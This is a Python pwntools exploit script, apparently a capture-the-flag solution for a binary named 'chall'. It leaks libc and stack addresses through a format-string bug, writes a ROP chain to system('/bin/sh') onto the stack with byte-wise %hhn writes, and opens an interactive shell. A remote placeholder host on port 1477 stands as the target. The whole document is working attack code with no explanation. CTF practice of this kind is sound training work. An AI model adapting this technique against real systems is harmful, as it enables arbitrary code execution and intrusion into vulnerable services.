#!/usr/bin/env python3

from pwn import *
import sys
import os
import random

exe = ELF("./chall")
libc = exe.libc

context.binary = exe
context.terminal = 'tmux split-window -h -p 65'.split()
context.log_level = 'debug'

cmd = '''
set max-visualize-chunk-size 0x500
b *main
b *main+171
c
'''


def conn(cmd):
    global r
    if 'i' in sys.argv:
        context.log_level = 'info'
    elif 'c' in sys.argv:
        context.log_level = 'critical'
    if '1' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
    elif '2' in sys.argv or 'server' in sys.argv:
        r = remote('addr', 1477)
    else:
        if context.arch == 'i386' or context.arch == 'amd64':
            r = process([exe.path], aslr=False)
        else:
            exit('arch not supported')
        sleep(1)
        gdb.attach(r, cmd)


def main():
    global r
    global payload
    conn(cmd)
    rop = ROP(exe)
    
    r.sendlineafter(b'? ', b'%15$p %19$p')
    r.recvuntil(b'but ')
    leaks = [int(x[2:], 16) for x in r.recvuntilS(b'??', drop=True).split()]
    libc.address = leaks[0] - (0x29d10+128)
    stack = leaks[1] - 0x158
    print(hex(libc.address), hex(stack))

    rop = ROP(libc)

    ropchain = flat(rop.rdi.address, next(libc.search(b'/bin/sh\0')), libc.sym.system)

    for offset, byte in enumerate(ropchain):
        if byte != 0:
            r.sendafter(b'? ', f'%{byte}c%11$hhn'.encode().ljust(12, b'\0') + p64(stack+offset))

    r.sendafter(b'? ', f'%{0xb7}c%11$hhn'.encode().ljust(12, b'\0') + p64(stack-8))
    
    context.log_level = 'debug'
    r.interactive()


if __name__ == "__main__":
    main()
